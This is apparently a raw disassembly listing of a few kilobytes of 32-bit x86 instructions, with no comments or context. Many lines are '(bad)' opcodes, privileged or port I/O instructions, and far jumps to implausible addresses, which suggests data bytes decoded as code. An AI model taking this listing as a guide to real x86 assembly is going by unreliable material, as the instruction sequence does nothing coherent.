  40612d:	jp     0x4061a2
  40612f:	cs xchg esp,eax
  406131:	jg     0x4060f3
  406133:	sub    BYTE PTR [esi-0x3f],dl
  406136:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406137:	fnstsw WORD PTR [edi+0x2a83f63b]
  40613d:	shl    DWORD PTR [edi+ecx*8],1
  406140:	or     BYTE PTR [edx+0x3b],0x96
  406144:	jecxz  0x4060ea
  406146:	push   edx
  406147:	xor    DWORD PTR [esi-0x58],0x19fd4abf
  40614e:	fimul  WORD PTR [ebx]
  406150:	pop    es
  406151:	and    DWORD PTR [esi+eax*4],edi
  406154:	mov    DWORD PTR [eax],0xa9884c9a
  40615a:	add    al,0x66
  40615c:	or     ecx,eax
  40615e:	mov    bl,0x4a
  406160:	xor    DWORD PTR [ebx+edi*1-0x9256636],0x726a3af3
  40616b:	ja     0x40618a
  40616d:	mov    eax,0xc165cbcb
  406172:	test   DWORD PTR [esi+0x58],esi
  406175:	sub    ebx,DWORD PTR [eax+edi*8]
  406178:	pop    esi
  406179:	adc    BYTE PTR [ecx-0x7ef8c1f8],bl
  40617f:	fidivr WORD PTR cs:[ebx-0x3847bf6c]
  406186:	addr16 in al,dx
  406188:	loop   0x406183
  40618a:	pop    eax
  40618b:	dec    eax
  40618c:	add    al,0xa6
  40618e:	mov    BYTE PTR [ebp+0x51a07a53],bl
  406194:	and    BYTE PTR [eax-0x4a],dh
  406197:	sbb    ebp,edi
  406199:	mov    ds:0x1961379e,al
  40619e:	emms   
  4061a0:	jb     0x40617d
  4061a2:	adc    edi,ebx
  4061a4:	(bad)  [eax+0x158af3d9]
  4061aa:	and    eax,0x5aa65651
  4061af:	jle    0x406212
  4061b1:	popf   
  4061b2:	mov    ebp,0xe4f8a02b
  4061b7:	int3   
  4061b8:	and    esi,ecx
  4061ba:	stos   DWORD PTR es:[edi],eax
  4061bb:	mov    fs,WORD PTR [edx]
  4061bd:	es (bad) 
  4061bf:	stc    
  4061c0:	sub    BYTE PTR [ebp-0x331c2b94],bl
  4061c6:	jp     0x40617d
  4061c8:	xor    al,0xec
  4061ca:	add    bl,al
  4061cc:	cmc    
  4061cd:	and    ah,BYTE PTR ds:[esi]
  4061d0:	fidivr DWORD PTR [ecx]
  4061d2:	sub    al,0xf8
  4061d4:	xchg   ecx,eax
  4061d5:	jne    0x4061b1
  4061d7:	out    0xf0,eax
  4061d9:	cmp    eax,DWORD PTR [ebx-0x7d9f5b2e]
  4061df:	mov    bl,0xf1
  4061e1:	clc    
  4061e2:	mov    DWORD PTR [edi*4-0x680c52df],ecx
  4061e9:	(bad)  
  4061eb:	lods   al,BYTE PTR ds:[esi]
  4061ec:	xchg   edi,eax
  4061ed:	mov    ds:0x309bcc7f,eax
  4061f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061f3:	jl     0x4061b6
  4061f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061f6:	xchg   ecx,eax
  4061f7:	retf   
  4061f8:	ins    BYTE PTR es:[edi],dx
  4061f9:	sbb    eax,0x315be09c
  4061fe:	test   BYTE PTR [edi+0x4056e19d],al
  406204:	in     al,0x33
  406206:	add    DWORD PTR ds:0xc19f762e,eax
  40620c:	mov    eax,ds:0xf8bc63c6
  406211:	xchg   ebx,eax
  406212:	aam    0x1e
  406214:	cmp    eax,DWORD PTR [ecx+0x55]
  406217:	push   0x54
  406219:	int3   
  40621a:	dec    ecx
  40621b:	sub    al,0x17
  40621d:	jmp    0x436875f6
  406222:	xchg   ecx,eax
  406223:	nop
  406224:	cmp    al,0xab
  406226:	pop    ebp
  406227:	and    esp,DWORD PTR [edi]
  406229:	cmp    al,0x11
  40622b:	stos   DWORD PTR es:[edi],eax
  40622c:	or     bl,BYTE PTR [edi+0x68a82d4f]
  406232:	lea    esp,[eax+edx*4-0xf]
  406236:	dec    edi
  406237:	cli    
  406238:	(bad)  
  406239:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40623a:	push   edi
  40623b:	push   edi
  40623c:	pop    ebp
  40623d:	pop    es
  40623e:	xchg   esp,eax
  40623f:	arpl   sp,bx
  406241:	xor    dl,BYTE PTR [eax-0xe]
  406244:	test   BYTE PTR [ebx],ah
  406246:	add    DWORD PTR [edi+0x26],ebp
  406249:	out    dx,al
  40624a:	(bad)  [ebp+0x428f6fd8]
  406250:	mov    ds:0x68f3afcf,eax
  406255:	mov    ecx,DWORD PTR [edi]
  406257:	xor    eax,0xc08b1832
  40625c:	fmul   QWORD PTR [edi+0x1f]
  40625f:	dec    esp
  406260:	cwde   
  406261:	fwait
  406262:	mov    cl,0x4f
  406264:	js     0x4061e9
  406266:	ja     0x40628b
  406268:	xchg   esp,eax
  406269:	add    eax,0xe8c05dcd
  40626e:	mov    ch,0xc3
  406270:	xchg   ebp,eax
  406271:	rol    DWORD PTR [ebp-0x77505a09],0xe8
  406278:	xchg   BYTE PTR [edi],dh
  40627a:	mov    dl,0xd0
  40627c:	push   edi
  40627d:	xchg   cl,dl
  40627f:	fcomp  DWORD PTR [ecx-0x3ec4c52]
  406285:	loopne 0x406225
  406287:	gs push 0x2f
  40628a:	outs   dx,DWORD PTR ds:[esi]
  40628b:	xchg   edi,eax
  40628c:	icebp  
  40628d:	retf   0xcb64
  406290:	jge    0x406308
  406292:	xlat   BYTE PTR ds:[ebx]
  406293:	(bad)  
  406294:	sub    BYTE PTR ds:[ebx],ah
  406297:	pop    edx
  406298:	xchg   BYTE PTR [esi+0x1fe96504],al
  40629e:	or     edi,DWORD PTR ds:0x695d495a
  4062a4:	mov    al,ds:0xb0ee9bf3
  4062a9:	popa   
  4062aa:	pushf  
  4062ab:	jmp    0x40626f
  4062ad:	sub    dh,BYTE PTR [edi+0xb4214b0]
  4062b3:	and    eax,ecx
  4062b5:	inc    ecx
  4062b6:	adc    DWORD PTR [ebx],0xffffffdb
  4062b9:	sbb    ecx,DWORD PTR [edi+0x28]
  4062bc:	test   DWORD PTR [eax+0x5db2a2e7],0x21bdfde9
  4062c6:	jl     0x4062c8
  4062c8:	adc    bh,BYTE PTR [edi+0x24]
  4062cb:	fwait
  4062cc:	cld    
  4062cd:	sar    DWORD PTR [edx+ebp*2-0x5ed8441d],cl
  4062d4:	cwde   
  4062d5:	mov    al,ds:0x877c0418
  4062da:	xchg   esp,eax
  4062db:	mov    ds:0x3b31fb07,al
  4062e0:	cmp    ecx,DWORD PTR [esi-0x65]
  4062e3:	xchg   DWORD PTR [ebp-0x28],eax
  4062e6:	adc    bh,BYTE PTR [eax+0x3e5cf304]
  4062ec:	inc    ebp
  4062ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062ee:	js     0x406315
  4062f0:	rcr    bh,cl
  4062f2:	inc    ecx
  4062f3:	jl     0x406326
  4062f5:	and    al,0xdc
  4062f7:	push   edx
  4062f8:	mov    WORD PTR [edx-0xc],?
  4062fb:	out    dx,al
  4062fc:	hlt    
  4062fd:	lds    esi,FWORD PTR [edx+0x56]
  406300:	popa   
  406301:	je     0x40630b
  406303:	push   ebx
  406304:	push   cs
  406305:	mov    ebx,0x2a7eb82b
  40630a:	adc    ah,0xaa
  40630d:	cmp    al,0xf3
  40630f:	gs jmp 0xeea3:0x8ddfa870
  406317:	sahf   
  406318:	fisub  DWORD PTR [ecx]
  40631a:	jg     0x406342
  40631c:	cmc    
  40631d:	out    0xae,eax
  40631f:	test   eax,0xb9120fbc
  406324:	adc    BYTE PTR [edi],ah
  406326:	xor    BYTE PTR [edi-0x377d7006],dl
  40632c:	and    eax,0x65783033
  406331:	outs   dx,DWORD PTR ds:[esi]
  406332:	loopne 0x406314
  406334:	jnp    0x4062c6
  406336:	popf   
  406337:	je     0x4063a4
  406339:	xchg   edx,eax
  40633a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40633b:	pop    ecx
  40633c:	jns    0x4063b3
  40633e:	xchg   esp,eax
  40633f:	or     BYTE PTR [edx-0x24cad711],bh
  406345:	xlat   BYTE PTR ds:[ebx]
  406346:	sar    DWORD PTR [edx+0x39],cl
  406349:	int    0x74
  40634b:	rcr    DWORD PTR [ebp-0x2f86b4fd],cl
  406351:	mov    eax,0xe5d1dbcc
  406356:	popf   
  406357:	ret    0x7b9a
  40635a:	les    ebp,FWORD PTR [edx-0x7ea5a362]
  406360:	in     eax,dx
  406361:	pop    esp
  406362:	adc    ecx,DWORD PTR [ebx]
  406364:	jo     0x4062fe
  406366:	dec    esp
  406367:	mov    WORD PTR [eax],?
  406369:	repz and al,0xc7
  40636c:	pusha  
  40636d:	ds je  0x40634f
  406370:	and    eax,0xbc4e5ad6
  406375:	dec    esp
  406376:	hlt    
  406377:	arpl   WORD PTR [edi],bx
  406379:	add    BYTE PTR [ecx+ebp*4-0x23],ah
  40637d:	dec    eax
  40637e:	pop    ecx
  40637f:	mov    ?,WORD PTR [edx]
  406381:	inc    ecx
  406382:	test   edx,ebx
  406384:	xor    al,0xa
  406386:	pop    eax
  406387:	pop    DWORD PTR [eax-0x1e399525]
  40638d:	iret   
  40638e:	std    
  40638f:	push   ebx
  406390:	sbb    al,0x52
  406392:	and    al,BYTE PTR [ebp+0x42737048]
  406398:	add    BYTE PTR [ebp-0x48],ah
  40639b:	mov    edi,0x73663696
  4063a0:	ins    BYTE PTR es:[edi],dx
  4063a1:	mov    esi,0x892d7dcb
  4063a6:	dec    ebx
  4063a7:	stc    
  4063a8:	sbb    al,0xe2
  4063aa:	cmp    BYTE PTR [esp+ebp*1],dl
  4063ad:	xlat   BYTE PTR ds:[ebx]
  4063ae:	lods   al,BYTE PTR ds:[esi]
  4063af:	jo     0x406370
  4063b1:	dec    ebx
  4063b2:	mov    ah,0x87
  4063b4:	lahf   
  4063b5:	ins    DWORD PTR es:[edi],dx
  4063b6:	call   0x3027:0x755a42f3
  4063bd:	xchg   BYTE PTR [ebp+0x3fd3a99b],dh
  4063c3:	dec    ebp
  4063c4:	xchg   ebx,eax
  4063c5:	xor    DWORD PTR [esi+edi*1],0xb497cabb
  4063cc:	mov    fs,WORD PTR [ebp+ebx*1+0x1188f862]
  4063d3:	lds    esp,FWORD PTR [edi-0x6a6f545c]
  4063d9:	jne    0x406448
  4063db:	int    0xb1
  4063dd:	sahf   
  4063de:	mov    eax,0x193ac3d9
  4063e3:	adc    BYTE PTR [esi-0x40],ch
  4063e6:	pop    ds
  4063e7:	jg     0x4063d9
  4063e9:	shl    DWORD PTR [edx-0x6fac37de],1
  4063ef:	and    DWORD PTR [eax-0x63232fa8],0x4ab53584
  4063f9:	jl     0x406471
  4063fb:	adc    esi,DWORD PTR [eax+ecx*1]
  4063fe:	ds clc 
  406400:	outs   dx,DWORD PTR ds:[esi]
  406401:	push   ecx
  406402:	cmp    DWORD PTR [esi],ebp
  406404:	dec    DWORD PTR [esi-0xf]
  406407:	inc    ebx
  406408:	add    eax,0xa132602c
  40640d:	mov    DWORD PTR [edx+eiz*8],ecx
  406410:	and    ah,ch
  406412:	gs dec esi
  406414:	push   esp
  406415:	ret    
  406416:	jnp    0x4063b7
  406418:	adc    BYTE PTR [ebx+0x37],dl
  40641b:	mov    ebp,0x83ddb2aa
  406420:	outs   dx,DWORD PTR ds:[esi]
  406421:	repz mov ch,0x5d
  406424:	cmp    eax,0xaf7b1e4b
  406429:	dec    ebp
  40642a:	inc    ebp
  40642b:	sti    
  40642c:	cmp    al,0xbf
  40642e:	dec    edx
  40642f:	fsubr  DWORD PTR [ebp+0x64]
  406432:	lahf   
  406433:	jno    0x4063dc
  406435:	in     eax,0xd
  406437:	mov    ebp,0xde305f4
  40643c:	mov    ds,WORD PTR [ebx-0x32037f6b]
  406442:	test   BYTE PTR [edx+0x16],bh
  406445:	dec    ebp
  406446:	cmp    BYTE PTR ds:0x4cde0ad,bh
  40644c:	imul   esi,DWORD PTR [ebx+0x63],0x16
  406450:	sub    al,0x4a
  406452:	cmp    dl,ah
  406454:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406455:	in     eax,dx
  406456:	dec    esp
  406457:	scas   eax,DWORD PTR es:[edi]
  406458:	pop    esi
  406459:	shrd   DWORD PTR [eax+0x6f550c3e],ebx,0xd0
  406461:	aam    0x85
  406463:	nop
  406464:	out    0x22,eax
  406466:	scas   eax,DWORD PTR es:[edi]
  406467:	ret    
  406468:	jns    0x406459
  40646a:	in     eax,dx
  40646b:	jno    0x4064de
  40646d:	cdq    
  40646e:	arpl   WORD PTR [ecx+0x33],bp
  406471:	mov    WORD PTR ds:0xb0ca2955,cs
  406477:	aaa    
  406478:	push   esi
  406479:	adc    BYTE PTR [ebp+ebx*8+0x49],0xb8
  40647e:	push   0xd6fdd356
  406483:	mov    eax,0x513f3344
  406488:	jmp    0x4064d7
  40648a:	pusha  
  40648b:	mov    ebp,0xf68effa9
  406490:	and    ch,BYTE PTR [edi+0x72]
  406493:	xchg   edi,eax
  406494:	int3   
  406495:	or     al,0x48
  406497:	imul   esp,DWORD PTR [ebx-0x53e8ad32],0x925fc9d4
  4064a1:	mov    edx,0xea7eb95f
  4064a6:	aas    
  4064a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064a8:	hlt    
  4064a9:	jmp    0xcce4a16e
  4064ae:	in     al,0x90
  4064b0:	ins    BYTE PTR es:[edi],dx
  4064b1:	push   0x97ea5934
  4064b6:	mov    esp,0x981dbc59
  4064bb:	push   edi
  4064bc:	inc    ebp
  4064bd:	and    cl,al
  4064bf:	xor    DWORD PTR [ebx-0x99dad17],ebp
  4064c5:	rol    BYTE PTR [ebx-0x2243bc5a],0x45
  4064cc:	jmp    0x7f2c15ed
  4064d1:	dec    esi
  4064d2:	jne    0x406483
  4064d4:	mov    ch,0xe2
  4064d6:	mov    DWORD PTR [ebx],ebp
  4064d8:	cmp    ebp,ecx
  4064da:	int3   
  4064db:	ss xchg ebp,eax
  4064dd:	xchg   edx,eax
  4064de:	test   eax,esi
  4064e0:	jp     0x40646e
  4064e2:	and    al,0xce
  4064e4:	call   0xc1b74cfe
  4064e9:	dec    ecx
  4064ea:	or     dh,BYTE PTR [esp+edx*8]
  4064ed:	pop    esi
  4064ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064ef:	sub    BYTE PTR ds:0xf5a148ef,dl
  4064f5:	(bad)  
  4064f6:	push   0x3a
  4064f8:	mov    ecx,0x3cf7480b
  4064fd:	or     BYTE PTR [eax-0x39],bl
  406500:	je     0x4064df
  406502:	ss in  eax,0x73
  406505:	and    DWORD PTR [esi-0x4d60b8f],esp
  40650b:	mov    WORD PTR [edx],ss
  40650d:	ret    
  40650e:	mov    dh,0x11
  406510:	mov    bl,bl
  406512:	mov    dh,0x35
  406514:	xor    DWORD PTR [ecx],edx
  406516:	push   0x5deaebcd
  40651b:	pop    ss
  40651c:	(bad)  ds:0x8d108b16
  406522:	addps  xmm5,XMMWORD PTR [ebp+0x6d]
  406526:	imul   ecx,DWORD PTR [ebx-0x77],0xffffffe5
  40652a:	jne    0x4064cf
  40652c:	call   DWORD PTR [eax+0x5db7de9d]
  406532:	xchg   bh,ch
  406534:	jbe    0x406529
  406536:	push   0xc2064803
  40653b:	jno    0x406541
  40653d:	or     al,0xf8
  40653f:	(bad)  
  406540:	std    
  406541:	sahf   
  406542:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406543:	xor    DWORD PTR [esi-0x34],ebp
  406546:	pop    es
  406547:	inc    ecx
  406548:	aam    0x95
  40654a:	aas    
  40654b:	popf   
  40654c:	push   ecx
  40654d:	ror    DWORD PTR [ebx+0x45abfbd5],cl
  406553:	mov    ebx,0x2b8b056c
  406558:	fist   DWORD PTR [edx]
  40655a:	lock jecxz 0x406517
  40655d:	scas   al,BYTE PTR es:[edi]
  40655e:	std    
  40655f:	mov    WORD PTR [esi-0x64],ds
  406562:	stos   BYTE PTR es:[edi],al
  406563:	jns    0x4065d5
  406565:	sbb    ebp,DWORD PTR cs:[edx-0x7af7dbf3]
  40656c:	out    0xcc,al
  40656e:	pop    ds
  40656f:	xor    dh,BYTE PTR [esi-0xd36dcfc]
  406575:	mov    eax,ds:0xdb9709c7
  40657a:	int    0x94
  40657c:	(bad)  
  40657d:	push   edx
  40657e:	out    0xff,al
  406580:	and    DWORD PTR [edi+esi*8-0x71],0x7a6d276d
  406588:	xlat   BYTE PTR ds:[ebx]
  406589:	cld    
  40658a:	daa    
  40658b:	add    al,BYTE PTR [ebx-0x6b]
  40658e:	inc    eax
  40658f:	sub    DWORD PTR [edi+0x1ca5e2ef],edx
  406595:	popa   
  406596:	jno    0x406553
  406598:	dec    edx
  406599:	lock mov cl,0x87
  40659c:	cs retf 0x5953
  4065a0:	ja     0x406596
  4065a2:	add    cl,BYTE PTR [esi+0x2933c27e]
  4065a8:	repnz push ecx
  4065aa:	inc    dx
  4065ac:	sub    DWORD PTR [esi],ebp
  4065ae:	mov    ds,WORD PTR [edx]
  4065b0:	hlt    
  4065b1:	daa    
  4065b2:	loop   0x4065b0
  4065b4:	sahf   
  4065b5:	nop
  4065b6:	or     DWORD PTR [ebp+ebx*2-0x6f],eax
  4065ba:	(bad)  
  4065bb:	shl    DWORD PTR [ebx+0x28],1
  4065be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065bf:	adc    DWORD PTR [ebx+0x48],esp
  4065c2:	and    al,0x9b
  4065c4:	frstor [ebp-0x4267b74d]
  4065ca:	imul   edx,DWORD PTR [eax+0x3f],0xffffffa2
  4065ce:	test   BYTE PTR [edx+0x15d892de],ah
  4065d4:	hlt    
  4065d5:	aas    
  4065d6:	and    BYTE PTR [ebx-0x6a47d0a2],cl
  4065dc:	and    eax,0xcd7c85db
  4065e1:	clc    
  4065e2:	jbe    0x406623
  4065e4:	cmp    DWORD PTR [edx+0x12],ebx
  4065e7:	data16 stos BYTE PTR es:[edi],al
  4065e9:	enter  0xa723,0x23
  4065ed:	jmp    0x406647
  4065ef:	ret    0xabc3
  4065f2:	in     eax,0x29
  4065f4:	adc    ebx,ecx
  4065f6:	sub    DWORD PTR [ebp-0x36fcf3ea],0x3d
  4065fd:	jb     0x4065ab
  4065ff:	mov    ds:0x13999204,eax
  406604:	jbe    0x4065e6
  406606:	arpl   WORD PTR [esi-0x5e],di
  406609:	sub    edi,DWORD PTR [ebx+0x61da3dd6]
  40660f:	jmp    0x4065c5
  406611:	jns    0x4065c4
  406613:	xor    edx,DWORD PTR [ebp+0x145bad47]
  406619:	mov    BYTE PTR [esi+0x7032cf6e],ah
  40661f:	jns    0x4065b0
  406621:	xchg   DWORD PTR [edi],eax
  406623:	enter  0xbd69,0xc3
  406627:	adc    bl,BYTE PTR [ebx+edi*1-0x45]
  40662b:	arpl   cx,cx
  40662d:	in     eax,dx
  40662e:	ja     0x40661e
  406630:	cdq    
  406631:	dec    esp
  406632:	xor    edi,DWORD PTR [edi-0x29864587]
  406638:	bound  ecx,QWORD PTR [ecx-0x7a]
  40663b:	loope  0x406660
  40663d:	hlt    
  40663e:	push   0x10
  406640:	es int 0xf1
  406643:	(bad)  
  406644:	imul   esi,DWORD PTR [ecx+0x37a1eb1b],0xffffffe4
  40664b:	scas   eax,DWORD PTR es:[edi]
  40664c:	sbb    eax,esi
  40664e:	ret    
  40664f:	pop    ebx
  406650:	loopne 0x406625
  406652:	sub    BYTE PTR [eax-0x7],al
  406655:	jmp    0x40668f
  406657:	pop    ebx
  406658:	loope  0x406616
  40665a:	fs ret 0x4396
  40665e:	xchg   ecx,eax
  40665f:	sbb    al,0x8a
  406661:	adc    eax,0x40ed66f5
  406666:	inc    esp
  406667:	or     eax,0xa72c00fb
  40666c:	jnp    0x40669c
  40666e:	aas    
  40666f:	xchg   ebx,eax
  406670:	int3   
  406671:	or     dh,BYTE PTR [ecx-0x54]
  406674:	xchg   esi,eax
  406675:	outs   dx,DWORD PTR ds:[esi]
  406676:	icebp  
  406677:	stc    
  406678:	adc    DWORD PTR [edi-0x70],eax
  40667b:	call   0x70a03043
  406680:	fdivr  QWORD PTR [ebp+ebx*8-0x21]
  406684:	mov    esi,0x88251e3a
  406689:	shr    BYTE PTR [edi-0x68],cl
  40668c:	loope  0x406611
  40668e:	inc    edi
  40668f:	pop    ss
  406690:	xchg   edx,eax
  406691:	sub    BYTE PTR [ebx-0x1],ah
  406694:	push   0xdfea5442
  406699:	leave  
  40669a:	adc    BYTE PTR [ebp+0x93803aa],0x82
  4066a1:	jg     0x4066dc
  4066a3:	xor    edi,DWORD PTR [edi]
  4066a5:	popa   
  4066a6:	lods   al,BYTE PTR ds:[esi]
  4066a7:	push   cs
  4066a8:	dec    eax
  4066a9:	call   DWORD PTR [ecx-0xc]
  4066ac:	and    al,0x47
  4066ae:	fcom   DWORD PTR [esi-0x3673e94e]
  4066b4:	in     al,0xae
  4066b6:	mov    es,WORD PTR cs:[ebx+0x66]
  4066ba:	cmp    bh,BYTE PTR [esi+0x63]
  4066bd:	call   0x5489:0x9f48d2dc
  4066c4:	int3   
  4066c5:	out    0x3f,al
  4066c7:	or     al,0x67
  4066c9:	scas   eax,DWORD PTR es:[edi]
  4066ca:	dec    eax
  4066cb:	lods   eax,DWORD PTR ds:[esi]
  4066cc:	(bad)  [ebx-0x63]
  4066cf:	cmp    al,0x4
  4066d1:	adc    al,0x12
  4066d3:	fcmovb st,st(3)
  4066d5:	lea    ecx,[edi+0x3f]
  4066d8:	and    ecx,esi
  4066da:	retf   0x229
  4066dd:	and    eax,0x4e030eb7
  4066e2:	(bad)  
  4066e3:	fsub   DWORD PTR [edi+0x6997fbb3]
  4066e9:	outs   dx,BYTE PTR ds:[esi]
  4066ea:	hlt    
  4066eb:	test   BYTE PTR [esp+esi*2-0x31737e57],al
  4066f2:	sub    al,0x11
  4066f4:	int    0x92
  4066f6:	adc    DWORD PTR [esi],esi
  4066f8:	pop    ecx
  4066f9:	call   0x228c:0x5ee8eea3
  406700:	cmp    BYTE PTR [esi],bl
  406702:	clc    
  406703:	mov    esp,0xec7c9afd
  406708:	adc    al,0x69
  40670a:	mov    edi,edi
  40670c:	xlat   BYTE PTR ds:[ebx]
  40670d:	iret   
  40670e:	mov    ds:0x34b719ec,al
  406713:	or     eax,0x398d212c
  406718:	or     eax,DWORD PTR [eax-0x41737b6]
  40671e:	pcmpgtw mm2,QWORD PTR [eax-0xb]
  406722:	xchg   DWORD PTR [ecx],esi
  406724:	or     ebp,DWORD PTR [ecx+0x11144a8e]
  40672a:	jle    0x4066e2
  40672c:	or     BYTE PTR gs:[edx+0x26],0xae
  406731:	ret    0x807
  406734:	test   ax,0x497
  406738:	push   0x17caa2a4
  40673d:	push   esp
  40673e:	mov    edx,0xd7e6919f
  406743:	inc    ecx
  406744:	and    BYTE PTR ds:0x16fc2597,al
  40674a:	mov    eax,ds:0x35dc712e
  40674f:	add    BYTE PTR [edx-0x14206e79],bh
  406755:	test   eax,0x977b130
  40675a:	daa    
  40675b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40675c:	cld    
  40675d:	mov    ds:0x34c7fb46,al
  406762:	mov    bl,0xf2
  406764:	mul    DWORD PTR [edx]
  406766:	mov    ah,0x38
  406768:	imul   ebx,DWORD PTR [ebp+0x326c917e],0xffffffc8
  40676f:	das    
  406770:	xchg   ecx,eax
  406771:	dec    ebp
  406772:	sub    BYTE PTR [eax],0xbd
  406775:	fchs   
  406777:	add    DWORD PTR ds:0xe48f8695,esi
  40677d:	cmp    DWORD PTR ds:0xbc3c5109,0x32
  406784:	cwde   
  406785:	aas    
  406786:	and    eax,0x55fa75b4
  40678b:	loope  0x4067d5
  40678d:	mov    dl,0x2f
  40678f:	fimul  WORD PTR [ecx+0x28]
  406792:	aas    
  406793:	jecxz  0x406783
  406795:	test   eax,0x5d4780c1
  40679a:	mov    dl,0x65
  40679c:	mov    es,WORD PTR [esi+0x1202b7b1]
  4067a2:	maskmovq mm5,mm7
  4067a5:	sub    edx,DWORD PTR [edx]
  4067a7:	jmp    0x49af:0x6b08d419
  4067ae:	or     DWORD PTR [esi+0x3dde56c2],ebp
  4067b4:	sti    
  4067b5:	outs   dx,DWORD PTR ds:[esi]
  4067b6:	imul   ecx,DWORD PTR [eax+0x53],0x4c
  4067ba:	or     edx,DWORD PTR [eax]
  4067bc:	test   eax,0x793160cc
  4067c1:	addr16 sub al,0x5a
  4067c4:	in     al,0x5a
  4067c6:	cmp    al,0x2b
  4067c8:	add    DWORD PTR [edi+0x4d7fd5f7],0x41
  4067cf:	lds    eax,FWORD PTR [edi-0x78]
  4067d2:	dec    esp
  4067d3:	das    
  4067d4:	xchg   ebp,eax
  4067d5:	cli    
  4067d6:	add    bl,bl
  4067d8:	sbb    DWORD PTR [ebp-0x5d],ebp
  4067db:	test   eax,0x42ac6074
  4067e0:	out    0xc2,al
  4067e2:	jp     0x406785
  4067e4:	repz pusha 
  4067e6:	xchg   esi,eax
  4067e7:	mov    edx,0xa2b98423
  4067ec:	jl     0x406772
  4067ee:	dec    esi
  4067ef:	dec    edx
  4067f0:	shl    ch,0x2c
  4067f3:	stos   DWORD PTR es:[edi],eax
  4067f4:	fld    QWORD PTR [edi]
  4067f6:	scas   al,BYTE PTR es:[edi]
  4067f7:	out    0x86,al
  4067f9:	jno    0x406875
  4067fb:	dec    ebx
  4067fc:	inc    eax
  4067fd:	leave  
  4067fe:	loop   0x4067e0
  406800:	add    BYTE PTR [eax+0x781766c4],0xe9
  406807:	mov    dh,0xb5
  406809:	std    
  40680a:	or     bl,BYTE PTR [esi+0x47]
  40680d:	xor    BYTE PTR ds:0xe9314820,bh
  406813:	das    
  406814:	or     eax,0xbbe039b6
  406819:	or     al,bl
  40681b:	das    
  40681c:	and    cl,BYTE PTR [edi]
  40681e:	rcr    BYTE PTR fs:[edi],cl
  406821:	shl    eax,0x1e
  406824:	adc    al,BYTE PTR [eax+0xc]
  406827:	push   ebp
  406828:	dec    ebp
  406829:	and    DWORD PTR [ecx],0x5a
  40682c:	xor    BYTE PTR [ebx+0x74b7d8c1],ah
  406832:	lds    ebp,FWORD PTR [esi+edi*2]
  406835:	mov    dh,BYTE PTR [ebp+ebx*1-0x4b]
  406839:	jns    0x4068a4
  40683b:	stc    
  40683c:	push   0xffffffc4
  40683e:	cwde   
  40683f:	ins    DWORD PTR es:[edi],dx
  406840:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406841:	xchg   DWORD PTR [esi-0x612c553f],esi
  406847:	fisubr WORD PTR [edx-0x2d9e4eb5]
  40684d:	pusha  
  40684e:	cmc    
  40684f:	jo     0x406888
  406851:	jns    0x4067e8
  406853:	loopne 0x406844
  406855:	sub    al,0xfe
  406857:	add    al,bh
  406859:	icebp  
  40685a:	mov    edi,0x6b7edb2b
  40685f:	les    esi,FWORD PTR [esi]
  406861:	out    dx,al
  406862:	adc    edi,DWORD PTR fs:[ecx-0x2]
  406866:	xchg   edi,eax
  406867:	fcom   DWORD PTR [edx+ecx*8-0x5f]
  40686b:	std    
  40686c:	inc    eax
  40686d:	js     0x4068e9
  40686f:	sbb    BYTE PTR [ebp-0x5],dh
  406872:	loop   0x4068e5
  406874:	lods   al,BYTE PTR ds:[esi]
  406875:	or     ah,0xe1
  406878:	adc    DWORD PTR [ebx+edi*8-0x48],ecx
  40687c:	mov    eax,0xa4bb3890
  406881:	dec    edi
  406882:	lahf   
  406883:	jno    0x40684b
  406885:	sbb    eax,0xb3ee6b72
  40688a:	xchg   esi,eax
  40688b:	fld    TBYTE PTR [ebx+0x3b7ecc24]
  406891:	call   0x9290:0x8fd431f3
  406898:	inc    ebx
  406899:	dec    esi
  40689a:	mov    eax,DWORD PTR [ebx]
  40689c:	popa   
  40689d:	test   al,0xd1
  40689f:	rcr    cl,0xfa
  4068a2:	scas   eax,DWORD PTR es:[edi]
  4068a3:	ja     0x40691f
  4068a5:	pusha  
  4068a6:	ror    BYTE PTR [ebx+ebx*8-0x3],0x2b
  4068ab:	out    dx,al
  4068ac:	pop    esp
  4068ad:	lods   al,BYTE PTR ds:[esi]
  4068ae:	fst    DWORD PTR [ebp+0x49]
  4068b1:	sbb    DWORD PTR [ebx+0x4a1e1c4a],ecx
  4068b7:	adc    BYTE PTR [eax+0x5e],0x15
  4068bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068bc:	(bad)  
  4068bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068be:	add    ebx,DWORD PTR [edi]
  4068c0:	(bad)  
  4068c1:	retf   
  4068c2:	cs pop es
  4068c4:	ins    BYTE PTR es:[edi],dx
  4068c5:	jg     0x406946
  4068c7:	rol    DWORD PTR [ebx+0x7c75de13],0xed
  4068ce:	jge    0x406880
  4068d0:	imul   esp,DWORD PTR [ebx+0x6f1bc0c1],0x46fcda52
  4068da:	lods   al,BYTE PTR ds:[esi]
  4068db:	fsubrp st(1),st
  4068dd:	(bad)  
  4068df:	popf   
  4068e0:	push   ebx
  4068e1:	pop    ds
  4068e2:	cmp    ebx,edx
  4068e4:	and    eax,DWORD PTR [ecx+eiz*1-0x7c3099a8]
  4068eb:	sbb    ebx,edx
  4068ed:	mov    bl,0x2f
  4068ef:	add    DWORD PTR [edx+0x8c00880],ebp
  4068f5:	mov    dl,0x4
  4068f7:	stos   DWORD PTR es:[edi],eax
  4068f8:	dec    eax
  4068f9:	aaa    
  4068fa:	std    
  4068fb:	lock cmp dh,BYTE PTR ss:[ebx]
  4068ff:	push   esp
  406900:	repz push edx
  406902:	mov    BYTE PTR [ebp+ecx*4-0x52],ah
  406906:	int    0xc0
  406908:	ins    BYTE PTR es:[edi],dx
  406909:	mov    al,0x52
  40690b:	add    edi,DWORD PTR ds:0xc43951ab
  406911:	inc    esp
